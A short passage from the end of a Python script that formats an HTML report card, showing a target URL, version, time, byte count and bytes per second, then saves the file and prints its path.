        f"<div class='card'><h3>Details</h3>"
        f"<p>Target: <code>{url}</code></p>"
        f"<p>Version: {ver}</p><p>Time: {ts}</p>"
        f"<p>Bytes: {byts:,}</p><p>BPS: {bps:,.0f}</p></div>"
        "</body></html>"
    )
    with open(path, "w") as f:
        f.write(html)
    print(f"\nReport: {path}")

if __name__ == "__main__":
    main()
